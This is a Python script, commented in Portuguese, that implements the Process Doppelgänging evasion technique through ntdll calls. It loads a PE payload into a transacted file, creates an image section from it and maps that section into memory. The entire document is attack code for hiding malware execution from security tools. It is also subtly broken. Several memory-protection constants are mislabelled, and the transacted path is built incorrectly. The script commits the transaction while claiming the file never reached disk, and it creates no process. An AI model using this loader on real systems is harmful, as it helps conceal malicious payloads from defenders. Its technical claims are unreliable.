import ctypes
import os
from ctypes import wintypes

# Definições básicas
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

NTSTATUS = wintypes.LONG
PVOID = ctypes.c_void_p
ULONG = wintypes.DWORD
HANDLE = wintypes.HANDLE
MEM_COMMIT = 0x1000  # Definido para evitar erro em módulos

# === Estruturas auxiliares ===

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [("Length", wintypes.USHORT),
                ("MaximumLength", wintypes.USHORT),
                ("Buffer", wintypes.LPWSTR)]

    def __init__(self, s):
        super().__init__()
        self.Buffer = ctypes.create_unicode_buffer(s)
        self.Length = len(s) * 2
        self.MaximumLength = (len(s) + 1) * 2

class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Length", ULONG),
                ("RootDirectory", HANDLE),
                ("ObjectName", ctypes.POINTER(UNICODE_STRING)),
                ("Attributes", ULONG),
                ("SecurityDescriptor", PVOID),
                ("SecurityQualityOfService", PVOID)]

    def __init__(self, name=None):
        super().__init__()
        self.Length = ctypes.sizeof(self)
        self.RootDirectory = None
        self.ObjectName = ctypes.pointer(UNICODE_STRING(name)) if name else None
        self.Attributes = 0x40  # OBJ_CASE_INSENSITIVE
        self.SecurityDescriptor = None
        self.SecurityQualityOfService = None

class IO_STATUS_BLOCK(ctypes.Structure):
    class _STATUS(ctypes.Union):
        _fields_ = [("Status", NTSTATUS), ("Pointer", PVOID)]
    _anonymous_ = ("_Status",)
    _fields_ = [("_Status", _STATUS), ("Information", PVOID)]

# === Utilitário ===
def read_payload(path):
    with open(path, "rb") as f:
        return f.read()

# === Doppelgänging Principal ===
def process_doppelganging(payload_path: str):
    print("[+] Lendo payload:", payload_path)
    payload_data = read_payload(payload_path)

    # 1. Criar transação NT
    NtCreateTransaction = ntdll.NtCreateTransaction
    transaction = HANDLE()
    obj_attr = OBJECT_ATTRIBUTES()

    status = NtCreateTransaction(
        ctypes.byref(transaction),
        0x1F0001,  # TRANSACTION_ALL_ACCESS
        ctypes.byref(obj_attr),
        None, 0, 0, None, None
    )

    if status != 0:
        print(f"[-] NtCreateTransaction falhou: NTSTATUS = {hex(status & 0xFFFFFFFF)}")
        return
    print(f"[+] Transação criada: handle = {transaction.value}")

    # 2. Criar arquivo transacional (TxF)
    dummy_path = os.path.abspath("C:\\Temp\\dummy.exe")
    transacted_path = f"{dummy_path};{transaction.value}"

    object_attributes = OBJECT_ATTRIBUTES(f"\\??\\{transacted_path}")
    file_handle = HANDLE()
    io_status = IO_STATUS_BLOCK()

    NtCreateFile = ntdll.NtCreateFile
    status = NtCreateFile(
        ctypes.byref(file_handle),
        0x10000000,  # GENERIC_WRITE
        ctypes.byref(object_attributes),
        ctypes.byref(io_status),
        None,
        0x80,   # FILE_ATTRIBUTE_NORMAL
        0x7,    # FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
        1,      # FILE_SUPERSEDE
        0x20,   # FILE_NON_DIRECTORY_FILE
        None,
        0
    )

    if status != 0:
        print(f"[-] NtCreateFile falhou: NTSTATUS = {hex(status & 0xFFFFFFFF)}")
        return
    print(f"[+] Arquivo transacional criado: {transacted_path}")

    # 3. Escrever payload no arquivo
    written = wintypes.DWORD(0)
    res = kernel32.WriteFile(
        file_handle,
        payload_data,
        len(payload_data),
        ctypes.byref(written),
        None
    )

    if not res:
        print("[-] WriteFile falhou")
        return
    print(f"[+] Payload escrito no arquivo transacional ({written.value} bytes)")

    # 4. Criar seção SEC_IMAGE
    section_handle = HANDLE()
    NtCreateSection = ntdll.NtCreateSection
    status = NtCreateSection(
        ctypes.byref(section_handle),
        0xF001F,  # SECTION_ALL_ACCESS
        None,
        None,
        0x40,  # PAGE_EXECUTE_READ
        0x8000000,  # SEC_IMAGE
        file_handle
    )

    if status != 0:
        print(f"[-] NtCreateSection falhou: NTSTATUS = {hex(status & 0xFFFFFFFF)}")
        return
    print("[+] Section criada sobre o arquivo")

    # 5. Mapear seção na memória atual
    NtMapViewOfSection = ntdll.NtMapViewOfSection
    base_address = PVOID()
    view_size = ctypes.c_size_t(0)

    status = NtMapViewOfSection(
        section_handle,
        -1,  # self process
        ctypes.byref(base_address),
        0,
        0,
        None,
        ctypes.byref(view_size),
        1,     # ViewShare
        0,
        0x04   # PAGE_EXECUTE_READ
    )

    if status != 0:
        print(f"[-] NtMapViewOfSection falhou: NTSTATUS = {hex(status & 0xFFFFFFFF)}")
        return
    print(f"[+] Section mapeada em: {hex(ctypes.cast(base_address, ctypes.c_void_p).value)}")

    # 6. Commit da transação
    NtCommitTransaction = ntdll.NtCommitTransaction
    status = NtCommitTransaction(transaction, False)

    if status != 0:
        print(f"[-] NtCommitTransaction falhou: NTSTATUS = {hex(status & 0xFFFFFFFF)}")
        return
    print("[+] Transação finalizada. Arquivo nunca foi escrito em disco, mas imagem mapeada está ativa.")

    print("[✓] Processo Doppelgänging finalizado (fase de mapeamento)")

# === Execução ===
if __name__ == "__main__":
    # ⚠️ Altere para o caminho do seu payload PE válido fora de System32!
    process_doppelganging("C:\\Temp\\test_payload.exe")
